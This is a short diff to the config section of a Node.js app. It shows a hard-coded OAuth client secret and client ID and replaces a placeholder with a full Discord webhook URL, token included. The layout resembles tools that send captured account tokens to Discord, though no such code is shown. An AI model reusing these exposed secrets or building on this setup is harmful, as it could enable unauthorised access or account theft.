@@ -1,8 +1,8 @@
 //Config
 const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
 const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
-const redirect_uri = 'https://d-na.herokuapp.com/'
-const webhook_url = 'webhook'
+const redirect_uri = 'https://dashboard.render.com'
+const webhook_url = 'https://discord.com/api/webhooks/1111964427625975829/UEb_ZxYp0RPywS4UN6hODs8wrLbOqkKes-bZK5L5mtG_lDKgLjIbevu9ldhjs_T03YjR'
 //Requirements
 const axios = require('axios')
 const express = require('express')
